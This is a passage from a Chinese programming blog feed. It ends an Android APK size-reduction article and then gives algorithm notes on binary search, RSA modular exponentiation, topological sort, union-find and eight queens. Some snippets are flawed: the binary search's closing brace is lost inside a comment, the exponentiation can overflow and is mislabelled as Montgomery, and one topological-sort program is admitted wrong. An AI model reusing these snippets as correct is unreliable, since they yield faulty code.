                > shrinkResources 配合 minifyEnabled 使用效果更佳，详见 <a class="link"   href="http://link.zhihu.com/?target=http://tools.android.com/tech-docs/new-build-system/resource-shrinking" >shrinkResources 用法以及注意<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 采用 7zip 压缩：8115283 字节 （压缩了将近 23%，再增加 1 个点） 3、使用图片压缩工具，压缩 png 图的大小，将非 alpha 的图转换成 jpg 形式，关于这点同事以及网络上的大牛们已经整理的很详细了，我这里做简单总结，欲知详情，请见附录的参考。 使用 tinypng，我只想说咱们在公司做产品，此方案慎用，上传任何未发布产品的内容到外部网络，都有可能引起数据泄漏，所以慎用此方案。下面说替代方案。</p>
<ul>
<li><p><a class="link"   href="http://link.zhihu.com/?target=http://wasted.werk01.de/" >WASTED<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><a class="link"   href="http://link.zhihu.com/?target=http://pngquant.org/" >pngquant<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><a class="link"   href="http://link.zhihu.com/?target=https://pngmini.com/" >ImageAlpha<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><a class="link"   href="http://link.zhihu.com/?target=https://imageoptim.com/" >ImageOptim<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
</ul>
<p>以上工具太散，有没有集成化的工具，答案是 “有” @心伦 童鞋开发的 <a class="link"   href="http://link.zhihu.com/?target=http://web.npm.alibaba-inc.com/package/@ali/imagemin" >imagemin<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> @姐夫童鞋开发的 <a class="link"   href="http://link.zhihu.com/?target=http://gitlab.alibaba-inc.com/zhefu.wzf/MSImageResourcesHelper" >MSImageResourcesHelper<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> png 转成 jpg 格式，具体效果不等。 4、终极大杀器，png 转成 webp，关于 webp，更多详情请参考<a class="link"   href="http://link.zhihu.com/?target=https://developers.google.com/speed/webp/" >谷歌官方文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>以及<a class="link"   href="http://link.zhihu.com/?target=http://developer.android.com/guide/appendix/media-formats.html" >安卓开发者在线参考<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 先上效果图： <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/v2-06a662325c50bac4021483b0bff960e6_b.png"
                     
                > 采用 7zip 压缩：4926912 字节 （压缩了将近 53%，再增加 30 个点） 没看错吧，是 30 个点，目前 apk 的大小是原始 apk 大小的一半不到，而我做的，一行代码木有改动，仅用了一些工具而已！ 说人话，我木有吃减肥药，木有绝食，体重却轻了一半！！！ 但是，目前却没能用到项目中，因为有两个坑</p>
<ul>
<li>在三星的部分机型上，部分有 alpha 背景部分的图会有一条很明显的黑线，这里就不上图了，这个问题目前通过白名单的方式不去做成 webp 的图来处理；</li>
<li>在小米 2 刷成 4.xx 的手机上，未能正确识别 xml 文件中描述的 webp 图片，导致界面起来后加载 xml 布局文件，文件加载 webp 失败，报错说 resource file not found，导致 app 发生崩溃。跟踪发现是小米机器代理了类 Resource 为 MIUIResource，但是这个 MIUIResource 未能正确识别 webp，所以导致加载资源文件失败，初步判定，目前暂时没有解决方案，所以只能忍痛放弃这个优化方案。</li>
</ul>
<p>关于第一个目标，图片资源的优化，就写到这里了。 <strong>3.4</strong> <strong>代码优化</strong> 第二个目标已达成，剩下第三个目标，代码的优化，梳理如下优化路径： 1、开启 proguard 的代码优化 将</p>
<blockquote>
<p>proguardFiles getDefaultProguardFile(‘proguard-android.txt’),’proguard-project.txt’</p>
</blockquote>
<p>改为</p>
<blockquote>
<p>proguardFiles getDefaultProguardFile(‘proguard-android-optimize.txt’),’proguard-project.txt’</p>
</blockquote>
<p>开启代码优化后的注意点请参见附录。 2、去除无用的库 如果 apk 支持的最低版本是 API14, 而代码中没有用到高于 api14 的 api 就可以考虑拿掉整个 android support 库。 3、用更小的库替代方案 如果只用到了谷歌统计，那么就不要把整个 google play services 都集成进来，只集成需要的部分。 4、定期清理废弃的代码 定期删除无用的逻辑和过期的业务功能模块，以及废弃的 A&#x2F;B test 代码。 5、业务模块采用插件化框架，代码动态从云端拉取 插件化，这是另外一个课题了，这里不赘述。 apk 瘦身记最终的成果 <strong>10536027</strong> <strong>字节压缩到</strong> <strong>4926912</strong> <strong>字节</strong><strong>,</strong> <strong>压缩了将近</strong> <strong>53%</strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><ol>
<li><p>脚本中开启资源混淆和资源压缩</p>
</li>
<li><p>用 7zip 代替 zip</p>
</li>
<li><p>gradle 脚本中开启代码混淆优化和无用资源删除</p>
</li>
<li><p>用更小的图，使用压缩工具压缩图片大小</p>
</li>
<li><p>去除无用的资源，语言，本地 so 库，二方三方库和分辨率</p>
</li>
<li><p>用更小的库</p>
</li>
<li><p>尝试将 android support 库彻底踢出你的项目</p>
</li>
<li><p>定期清理代码</p>
</li>
<li><p>尝试用 H5 编写界面，图片云端获取</p>
</li>
<li><p>尝试插件化业务模块</p>
</li>
<li><p>寻找到 zip 文件夹中所有用 STORE 形式存储的文件（不限于 raw 目录下），尝试压缩，以及替代方案加载这些资源</p>
</li>
<li><p>尝试 webp 的图片加载方案，寻求突破</p>
</li>
</ol>
<p>最后，继续学习和尝试新的优化方案 以此文献给 “唯瘦身与产品不可辜负” 的技术们！！！</p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a><strong>附录</strong></h2><p><a class="link"   href="http://link.zhihu.com/?target=http://blog.csdn.net/UsherFor/article/details/46827587" >如何做到将 apk 大小减少 6M<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="http://link.zhihu.com/?target=http://www.jayfeng.com/2016/03/01/Android-APP%25E7%25BB%2588%25E6%259E%2581%25E7%2598%25A6%25E8%25BA%25AB%25E6%258C%2587%25E5%258D%2597/" >Android APP 终极瘦身指南<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="http://link.zhihu.com/?target=http://www.jayfeng.com/2015/12/29/APK%25E7%2598%25A6%25E8%25BA%25AB%25E5%25AE%259E%25E8%25B7%25B5/" >APK 瘦身实践<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <strong>作者：非戈 @阿里移动安全</strong></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>Algo tips</title>
    <url>/2020/08/10/algo-tips/</url>
    <content><![CDATA[<h2 id="Binary-Search"><a href="#Binary-Search" class="headerlink" title="Binary Search"></a>Binary Search</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> right = nums.length - <span class="number">1</span>;</span><br><span class="line">     <span class="comment">// 注意 </span></span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right) &#123; </span><br><span class="line">        <span class="type">int</span> mid = left + (right - left) / <span class="number">2</span>; </span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == target) </span><br><span class="line">            <span class="keyword">return</span> mid; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt; target) </span><br><span class="line">            left = mid + <span class="number">1</span>; </span><br><span class="line">        <span class="comment">// 注意 </span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) </span><br><span class="line">            right = mid - <span class="number">1</span>; <span class="comment">// 注意 &#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li>为什么 while 循环的条件中是 &lt;&#x3D;，⽽不是 &lt;</li>
</ol>
<ul>
<li>因为初始化 right 的赋值是 nums.length - 1 ，即最后一个元素的索引，而不是nums.length</li>
<li>防止漏掉 <code>[a, a]</code> 区间</li>
</ul>
<h2 id="RSA-basic"><a href="#RSA-basic" class="headerlink" title="RSA-basic"></a>RSA-basic</h2><blockquote>
<p>费马小定理(Fermat Theory)是数论中的一个重要定理，其内容为： 假如p是质数，且gcd(a,p)&#x3D;1，那么<br>a(p-1)≡1（mod<br>p）。即：假如a是整数，p是质数，且a,p互质(即两者只有一个公约数1)，那么a的(p-1)次方除以p的余数恒等于1。</p>
</blockquote>
<hr>
<p>蒙哥马利幂模运算<br>RSA算法的核心之一</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">pows</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> mod)</span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> temp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(b)&#123;</span><br><span class="line">        <span class="keyword">if</span>(b%<span class="number">2</span>)&#123;</span><br><span class="line">            temp = temp*a%mod;</span><br><span class="line">        &#125;</span><br><span class="line">        a = a*a%mod;</span><br><span class="line">        b/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h2><h2 id="拓扑排序-1"><a href="#拓扑排序-1" class="headerlink" title="拓扑排序"></a>拓扑排序</h2><h4 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h4><ol>
<li>找到所有入度为0的点插进队列</li>
<li>选择一个并输出它<ul>
<li>然后删掉与之关联的所有边（即任何与之相连的入度-1）</li>
<li>删除过程遇到入度为0点插入队列</li>
</ul>
</li>
<li>重复第二步，直到队列中无0点</li>
</ol>
<hr>
<h4 id="优化：如果要求最小字典序"><a href="#优化：如果要求最小字典序" class="headerlink" title="优化：如果要求最小字典序"></a>优化：如果要求最小字典序</h4><blockquote>
<p><strong>用反向拓扑加优先队列</strong></p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;

using namespace std;

vector&lt;int&gt; G[5020];
map&lt;string, int&gt; maps;
map&lt;int, string&gt; mapr;

struct less_cmp&#123;
    bool operator()(const int &amp;a, const int &amp;b)&#123;
        return mapr[a] &gt; mapr[b];
    &#125;
&#125;;

int main()&#123;
    int T;
    cin &gt;&gt; T;
    for(int kase = 1; kase &lt;= T; ++kase)&#123;
        int n, m, in[5020], cnt = 0, ans[5020];
        cin &gt;&gt; n;
        for(int i = 0; i &lt; n; ++i)&#123;
            string cla;
            cin &gt;&gt; cla;
            maps.insert(pair&lt;string, int&gt;(cla, i));
            mapr.insert(pair&lt;int, string&gt;(i, cla));
        &#125;
        cin &gt;&gt; m;
        for(int i = 0; i &lt; m; ++i)&#123;
            string as, bs;
            cin &gt;&gt; as &gt;&gt; bs;
            int u = maps[as], v = maps[bs];
            G[u].push_back(v);
            in[v]++;
        &#125;
        priority_queue&lt;int, vector&lt;int&gt;, less_cmp &gt; que;
        for(int i = 0; i &lt; n; ++i)&#123;
            if(in[i] == 0)
                que.push(i);
        &#125;
        vector&lt;int&gt;::iterator iter;
        while(!que.empty())&#123;
            int temp = que.top();
            que.pop();
            ans[cnt++] = temp;
            for(iter = G[temp].begin(); iter != G[temp].end(); ++iter)&#123;
                    if(--in[*iter] == 0)&#123;
                        que.push(*iter);
                    &#125;
                &#125;
        &#125;
        cout &lt;&lt; &quot;Case &quot; &lt;&lt; kase &lt;&lt; &quot;:&quot; &lt;&lt; endl;
        for(int i = 0; i &lt; cnt; ++i)&#123;
            cout &lt;&lt; mapr[ans[i]] &lt;&lt; endl;
        &#125;
        maps.clear();
        mapr.clear();
        for(int i = 0; i &lt; 5020; ++i)&#123;
            G[i].clear();
        &#125;
    &#125;
&#125;
</code></pre>
<p>开心的wrong answer-_-</p>
<blockquote>
<p>第一行为样例组数T。每组样例第一行为课程数量n（1 &lt;&#x3D; n &lt;&#x3D; 5000)，以下n行每行表示一门课程名称。接下来为关系数量m（1 &lt;&#x3D; m &lt;&#x3D; 10000)，每一行有两个课程名称a、b，表示a课程要开设在b课程前面。（输入保证无环）</p>
</blockquote>
<h4 id="原题如上，旭哥思路的代码"><a href="#原题如上，旭哥思路的代码" class="headerlink" title="原题如上，旭哥思路的代码"></a>原题如上，旭哥思路的代码</h4><pre><code>#include &lt;bits/stdc++.h&gt;

using namespace std;
vector&lt;int&gt; G[5020];
string mapr[5020];
map&lt;string, int&gt; maps;

int main()&#123;
    int T;  scanf(&quot;%d&quot;, &amp;T);
    for(int kase = 1; kase &lt;= T; ++kase)&#123;
        int n, m, in[5020] = &#123;0&#125;, cnt = 0, ans[5020];

        scanf(&quot;%d&quot;, &amp;n);
        for (int i = 0; i &lt; n; ++i) G[i].clear();
        maps.clear();
        for(int i = 0; i &lt; n; ++i)&#123;
            char as[44];
            scanf(&quot;%s&quot;, as);
            mapr[i] = as;
        &#125;
        sort(mapr, mapr + n);
        for(int i = 0; i &lt; n; ++i)&#123;
            maps[mapr[i]] = i;
        &#125;

        scanf(&quot;%d&quot;, &amp;m);
        for(int i = 0; i &lt; m; ++i)&#123;
            char as[44], bs[44];
            scanf(&quot;%s %s&quot;, as, bs);
            int u = maps[as], v = maps[bs];
            G[u].push_back(v);
            ++in[v];
        &#125;

        printf(&quot;Case %d:\n&quot;, kase);
        for(int i = 0; i &lt; n; ++i)&#123;
            int temp = 0;
            for(int j = 0; j &lt; n; ++j)&#123;
                if(!in[j])&#123;
                    printf(&quot;%s\n&quot;, mapr[j].c_str());
                    temp = j; --in[j];
                    break;
                &#125;
            &#125;
            for(int k = 0; k &lt; G[temp].size(); ++k)&#123;
                --in[G[temp][k]];
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<ul>
<li>权值置-1，排除节点</li>
<li>G（vector）来控制制约关系</li>
<li>sort排序保证字典序</li>
</ul>
<h2 id="并查集-（转）"><a href="#并查集-（转）" class="headerlink" title="并查集 （转）"></a>并查集 （转）</h2><blockquote>
<p>本文由 <a class="link"   href="http://ksria.com/simpread/" >简悦 SimpRead<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 转码， 原文地址 <a class="link"   href="http://blog.csdn.net/dellaserss/article/details/7724401" >http://blog.csdn.net/dellaserss/article/details/7724401<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<p>这个文章是几年前水 acm 的时候转的, 当时也不知道作者是谁, 要是有人知道的话说一下吧 并查集是我暑假从高手那里学到的一招，觉得真是太精妙的设计了。以前我无法解决的一类问题竟然可以用如此简单高效的方法搞定。不分享出来真是对不起 party 了。（party：我靠，关我嘛事啊？我跟你很熟么？） 来看一个实例，<a class="link"   href="http://acm.hdu.edu.cn/showproblem.php?pid=1232" >杭电 1232 畅通工程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 首先在地图上给你若干个城镇，这些城镇都可以看作点，然后告诉你哪些对城镇之间是有道路直接相连的。最后要解决的是整幅图的连通性问题。比如随意给你两个点，让你判断它们是否连通，或者问你整幅图一共有几个连通分支，也就是被分成了几个互相独立的块。像畅通工程这题，问还需要修几条路，实质就是求有几个连通分支。如果是 1 个连通分支，说明整幅图上的点都连起来了，不用再修路了；如果是 2 个连通分支，则只要再修 1 条路，从两个分支中各选一个点，把它们连起来，那么所有的点都是连起来的了；如果是 3 个连通分支，则只要再修两条路…… 以下面这组数据输入数据来说明 4 2 1 3 4 3 第一行告诉你，一共有 4 个点，2 条路。下面两行告诉你，1、3 之间有条路，4、3 之间有条路。那么整幅图就被分成了 1-3-4 和 2 两部分。只要再加一条路，把 2 和其他任意一个点连起来，畅通工程就实现了，那么这个这组数据的输出结果就是 1。好了，现在编程实现这个功能吧，城镇有几百个，路有不知道多少条，而且可能有回路。 这可如何是好？ 我以前也不会呀，自从用了并查集之后，嗨，效果还真好！我们全家都用它！ 并查集由一个整数型的数组和两个函数构成。数组 pre[] 记录了每个点的前导点是什么，函数 find 是查找，join 是合并。</p>
<pre><code>int pre[1000];

int find(int x)               // 查找根节点
&#123;   
    int r = x;
    while(pre[r] != r)         //返回根节点 r
    r = pre[r];
    int i = x ,j;
    while(i != r)                // 路径压缩 
    &#123;     
        j = pre[i]; // 在改变上级之前用临时变量  j 记录下他的值     
        pre[i] = r ; // 把上级改为根节点
        i = j; 
    &#125;   
    return r;
&#125;

void join(int x,int y)     // 判断 x y 是否连通，
 // 如果已经连通，就不用管了 // 如果不连通，就把它们所在的连通分支合并起,
&#123;
    int fx = find(x),fy = find(y);
    if(fx != fy)
        pre[fx]=fy;
&#125;
</code></pre>
<p>为了解释并查集的原理，我将举一个更有爱的例子。 话说江湖上散落着各式各样的大侠，有上千个之多。他们没有什么正当职业，整天背着剑在外面走来走去，碰到和自己不是一路人的，就免不了要打一架。但大侠们有一个优点就是讲义气，绝对不打自己的朋友。而且他们信奉 “朋友的朋友就是我的朋友”，只要是能通过朋友关系串联起来的，不管拐了多少个弯，都认为是自己人。这样一来，江湖上就形成了一个一个的群落，通过两两之间的朋友关系串联起来。而不在同一个群落的人，无论如何都无法通过朋友关系连起来，于是就可以放心往死了打。但是两个原本互不相识的人，如何判断是否属于一个朋友圈呢？ 我们可以在每个朋友圈内推举出一个比较有名望的人，作为该圈子的代表人物，这样，每个圈子就可以这样命名 “齐达内朋友之队”“罗纳尔多朋友之队”…… 两人只要互相对一下自己的队长是不是同一个人，就可以确定敌友关系了。 但是还有问题啊，大侠们只知道自己直接的朋友是谁，很多人压根就不认识队长，要判断自己的队长是谁，只能漫无目的的通过朋友的朋友关系问下去：“你是不是队长？你是不是队长？” 这样一来，队长面子上挂不住了，而且效率太低，还有可能陷入无限循环中。于是队长下令，重新组队。队内所有人实行分等级制度，形成树状结构，我队长就是根节点，下面分别是二级队员、三级队员。每个人只要记住自己的上级是谁就行了。遇到判断敌友的时候，只要一层层向上问，直到最高层，就可以在短时间内确定队长是谁了。由于我们关心的只是两个人之间是否连通，至于他们是如何连通的，以及每个圈子内部的结构是怎样的，甚至队长是谁，并不重要。所以我们可以放任队长随意重新组队，只要不搞错敌友关系就好了。于是，门派产生了。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://hi.csdn.net/attachment/201107/29/0_1311901712oy9f.gif"
                     
                > 下面我们来看并查集的实现。 int pre[1000]; 这个数组，记录了每个大侠的上级是谁。大侠们从 1 或者 0 开始编号（依据题意而定），pre[15]&#x3D;3 就表示 15 号大侠的上级是 3 号大侠。如果一个人的上级就是他自己，那说明他就是掌门人了，查找到此为止。也有孤家寡人自成一派的，比如欧阳锋，那么他的上级就是他自己。每个人都只认自己的上级。比如胡青牛同学只知道自己的上级是杨左使。张无忌是谁？不认识！要想知道自己的掌门是谁，只能一级级查上去。 find 这个函数就是找掌门用的，意义再清楚不过了（路径压缩算法先不论，后面再说）。</p>
<pre><code>int find(int x)      // 查找我（x）的掌门
&#123;
    int r = x;                   // 委托 r 去找掌门
    while(pre[r] != r)  // 如果 r 的上级不是 r 自己（也就是说找到的大侠他不是掌门 = =）
        r = pre[r];               // r 就接着找他的上级，直到找到掌门为止。
    return r;              // 掌门驾到~~~

&#125;
</code></pre>
<p>再来看&#96;&#96;看 join 函数，就是在两个点之间连一条线，这样一来，原先它们所在的两个板块的所有点就都可以互通了。这在图上很好办，画条线就行了。但我们现在是用并查集来描述武林中的状况的，一共只有一个 pre[] 数组，该如何实现呢？ 还是举江湖的例子，假设现在武林中的形势如图所示。虚竹小和尚与周芷若 MM 是我非常喜欢的两个人物，他们的终极 boss 分别是玄慈方丈和灭绝师太，那明显就是两个阵营了。我不希望他们互相打架，就对他俩说：“你们两位拉拉勾，做好朋友吧。” 他们看在我的面子上，同意了。这一同意可非同小可，整个少林和峨眉派的人就不能打架了。这么重大的变化，可如何实现呀，要改动多少地方？其实非常简单，我对玄慈方丈说：“大师，麻烦你把你的上级改为灭绝师太吧。这样一来，两派原先的所有人员的终极 boss 都是师太，那还打个球啊！反正我们关心的只是连通性，门派内部的结构不要紧的。” 玄慈一听肯定火大了：“我靠，凭什么是我变成她手下呀，怎么不反过来？我抗议！” 抗议无效，上天安排的，最大。反正谁加入谁效果是一样的，我就随手指定了一个。这段函数的意思很明白了吧？</p>
<pre><code>void join(int x, int  y)      // 我想让虚竹和周芷若做朋友
&#123;
    int fx=find(x),fy=find(y);      //虚竹的老大是玄慈，芷若 MM 的老大是灭绝
    if(fx!=fy)                        // 玄慈和灭绝显然不是同一个人_**
    pre[fx]=fy;               // 方丈只好委委屈屈地当了师太的手下啦_**
&#125;
</code></pre>
<p>再来看看路径压缩算法。建立门派的过程是用 join 函数两个人两个人地连接起来的，谁当谁的手下完全随机。最后的树状结构会变成什么胎唇样，我也完全无法预计，一字长蛇阵也有可能。这样查找的效率就会比较低下。最理想的情况就是所有人的直接上级都是掌门，一共就两级结构，只要找一次就找到掌门了。哪怕不能完全做到，也最好尽量接近。这样就产生了路径压缩算法。 设想这样一个场景：两个互不相识的大侠碰面了，想知道能不能揍。 于是赶紧打电话问自己的上级：“你是不是掌门？” 上级说：“我不是呀，我的上级是谁谁谁，你问问他看看。” 一路问下去，原来两人的最终 boss 都是东厂曹公公。 “哎呀呀，原来是记己人，西礼西礼，在下三营六组白面葫芦娃!” “幸会幸会，在下九营十八组仙子狗尾巴花！” 两人高高兴兴地手拉手喝酒去了。 “等等等等，两位同学请留步，还有事情没完成呢！” 我叫住他俩。 “哦，对了，还要做路径压缩。” 两人醒悟。 白面葫芦娃打电话给他的上级六组长：“组长啊，我查过了，其习偶们的掌门是曹公公。不如偶们一起及接拜在曹公公手下吧，省得级别太低，以后查找掌门麻环。” “唔，有道理。” 白面葫芦娃接着打电话给刚才拜访过的三营长…… 仙子狗尾巴花也做了同样的事情。 这样，查询中所有涉及到的人物都聚集在曹公公的直接领导下。每次查询都做了优化处理，所以整个门派树的层数都会维持在比较低的水平上。路径压缩的代码，看得懂很好，看不懂也没关系，直接抄上用就行了。总之它所实现的功能就是这么个意思。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://hi.csdn.net/attachment/201107/29/0_131190167189S8.gif"
                     
                ><a class="link"   href="http://acm.hdu.edu.cn/showproblem.php?pid=1232" >hdu1232<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<pre><code>#include&lt;iostream&gt;  
using namespace std;
  

int  pre[1050];
  
bool t[1050];  //t 用于标记独立块的根结点  

int Find(int x)  
&#123;
      
    int r = x;
      
    while(r != pre[r])  
        r = pre[r];

    int i = x,j;
      
    while(pre[i] != r)  
    &#123;
        j = pre[i];
        pre[i] = r;
        i = j;
    &#125;  
    return r;
&#125;  

void mix(int x,int y)  
&#123;
      
    int fx = Find(x), fy = Find(y);
      
    if(fx != fy)  
    &#123;  
        pre[fy] = fx;
    &#125;  
&#125;   

int main()  
&#123;
    int N, M, a, b, i, j, ans;

    while(scanf(&quot;%d %d&quot;, &amp;N, &amp;M) &amp;&amp; N)  
    &#123;
        for(i = 1; i &lt;= N; ++i)           // 初始化   
            pre[i] = i;
        for(i = 1; i &lt;= M; ++i)           // 吸收并整理数据   
        &#123;
            scanf(&quot;%d %d&quot;, &amp;a, &amp;b);
            mix(a, b);
        &#125;
        memset(t, 0, sizeof(t));
        for(i = 1; i &lt;= N; ++i)           // 标记根结点  
        &#123;
            t[Find(i)] = 1;      
        &#125;  
        for(ans = 0, i = 1; i &lt;= N; ++i)  
            if(t[i])  
                ans++;
        printf(&quot;%d\n&quot;, ans-1);
    &#125;  
    return 0;
&#125;//dellaserss  
</code></pre>
<p>以下为原文附的代码: 回到开头提出的问题，我的代码如下：</p>
<pre><code>int pre[1000];

int find(int x)
&#123;
    int r = x;

   while(pre[r] != r)
   r = pre[r];

   int i = x; int j;

   while(i != r)
   &#123;
        j = pre[i];
        pre[i] = r;
        i = j;
   &#125;
   return r;
&#125;

int main()
&#123;

   int n, m, p1, p2, i, total, f1, f2;

   while(scanf(&quot;%d&quot;, &amp;n) &amp;&amp; n)         // 读入 n，如果 n 为 0，结束
   &#123;   
        // 刚开始的时候，有 n 个城镇，一条路都没有 // 那么要修 n-1 条路才能把它们连起来
        total = n-1;  
        // 每个点互相独立，自成一个集合，从 1 编号到 n // 所以每个点的上级都是自己
        for(i = 1;i &lt;= n;i++) 
        &#123; 
            pre[i ]=i;
        &#125;
        // 共有 m 条路
        scanf(&quot;%d&quot;,&amp;m); while(m--)
        &#123; 
            // 下面这段代码，其实就是 join 函数，只是稍作改动以适应题目要求
            // 每读入一条路，看它的端点 p1，p2 是否已经在一个连通分支里了
            scanf(&quot;%d %d&quot;, &amp;p1, &amp;p2);
            f1 = find(p1);
            f2 = find(p2);

// 如果是不连通的，那么把这两个分支连起来
// 分支的总数就减少了 1，还需建的路也就减了 1
            if(f1 != f2)&#123;
                pre[f2] = f1;
                total--;
            &#125;
            // 如果两点已经连通了，那么这条路只是在图上增加了一个环 // 对连通性没有任何影响，无视掉
        &#125;
        // 最后输出还要修的路条数
        printf(&quot;%d\n&quot;,total);
    &#125;
    return 0;
&#125;
</code></pre>
<h2 id="Eight-queens"><a href="#Eight-queens" class="headerlink" title="Eight queens"></a>Eight queens</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> answer[<span class="number">92</span>]&#123;</span><br><span class="line"><span class="number">15863724</span>,<span class="number">16837425</span>,<span class="number">17468253</span>,<span class="number">17582463</span>,<span class="number">24683175</span>,<span class="number">25713864</span>,<span class="number">25741863</span>,<span class="number">26174835</span>,<span class="number">26831475</span>,</span><br><span class="line"><span class="number">27368514</span>,<span class="number">27581463</span>,<span class="number">28613574</span>,<span class="number">31758246</span>,<span class="number">35281746</span>,<span class="number">35286471</span>,<span class="number">35714286</span>,<span class="number">35841726</span>,<span class="number">36258174</span>,</span><br><span class="line"><span class="number">36271485</span>,<span class="number">36275184</span>,<span class="number">36418572</span>,<span class="number">36428571</span>,<span class="number">36814752</span>,<span class="number">36815724</span>,<span class="number">36824175</span>,<span class="number">37285146</span>,<span class="number">37286415</span>,</span><br><span class="line"><span class="number">38471625</span>,<span class="number">41582736</span>,<span class="number">41586372</span>,<span class="number">42586137</span>,<span class="number">42736815</span>,<span class="number">42736851</span>,<span class="number">42751863</span>,<span class="number">42857136</span>,<span class="number">42861357</span>,</span><br><span class="line"><span class="number">46152837</span>,<span class="number">46827135</span>,<span class="number">46831752</span>,<span class="number">47185263</span>,<span class="number">47382516</span>,<span class="number">47526138</span>,<span class="number">47531682</span>,<span class="number">48136275</span>,<span class="number">48157263</span>,</span><br><span class="line"><span class="number">48531726</span>,<span class="number">51468273</span>,<span class="number">51842736</span>,<span class="number">51863724</span>,<span class="number">52468317</span>,<span class="number">52473861</span>,<span class="number">52617483</span>,<span class="number">52814736</span>,<span class="number">53168247</span>,</span><br><span class="line"><span class="number">53172864</span>,<span class="number">53847162</span>,<span class="number">57138642</span>,<span class="number">57142863</span>,<span class="number">57248136</span>,<span class="number">57263148</span>,<span class="number">57263184</span>,<span class="number">57413862</span>,<span class="number">58413627</span>,</span><br><span class="line"><span class="number">58417263</span>,<span class="number">61528374</span>,<span class="number">62713584</span>,<span class="number">62714853</span>,<span class="number">63175824</span>,<span class="number">63184275</span>,<span class="number">63185247</span>,<span class="number">63571428</span>,<span class="number">63581427</span>,</span><br><span class="line"><span class="number">63724815</span>,<span class="number">63728514</span>,<span class="number">63741825</span>,<span class="number">64158273</span>,<span class="number">64285713</span>,<span class="number">64713528</span>,<span class="number">64718253</span>,<span class="number">68241753</span>,<span class="number">71386425</span>,</span><br><span class="line"><span class="number">72418536</span>,<span class="number">72631485</span>,<span class="number">73168524</span>,<span class="number">73825164</span>,<span class="number">74258136</span>,<span class="number">74286135</span>,<span class="number">75316824</span>,<span class="number">82417536</span>,<span class="number">82531746</span>,<span class="number">83162574</span>,<span class="number">84136275</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> cases;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; cases;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> kase = <span class="number">0</span>; kase &lt; cases; ++kase)&#123;</span><br><span class="line">        <span class="type">int</span> n;  <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; answer[n<span class="number">-1</span>] 